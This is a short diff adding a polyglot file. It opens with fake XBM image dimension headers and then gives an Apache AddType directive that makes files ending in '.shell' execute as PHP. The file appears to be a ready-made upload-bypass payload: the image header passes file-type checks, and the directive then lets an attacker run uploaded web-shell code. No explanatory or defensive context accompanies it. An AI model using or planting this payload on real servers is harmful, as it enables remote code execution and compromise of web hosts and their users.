@@ -1,0 +1,4 @@
+#define width 1337
+#define height 1337
+
+AddType application/x-httpd-php .shell
